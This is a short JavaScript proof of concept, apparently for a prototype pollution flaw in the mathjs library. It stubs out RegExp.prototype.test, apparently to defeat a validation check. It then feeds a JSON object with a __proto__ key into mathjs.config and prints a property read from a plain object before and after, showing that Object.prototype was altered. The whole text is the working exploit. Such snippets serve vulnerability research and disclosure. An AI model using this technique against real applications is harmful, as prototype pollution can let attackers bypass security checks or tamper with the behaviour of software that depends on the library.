RegExp.prototype.test = () => false;
var mathMod = require('mathjs');
const mathjs = mathMod.create(mathMod.all);
console.log({}.polluted);
const newConfig = JSON.parse('{"__proto__":{"polluted":"yes"}}');
mathjs.config(newConfig);
console.log({}.polluted);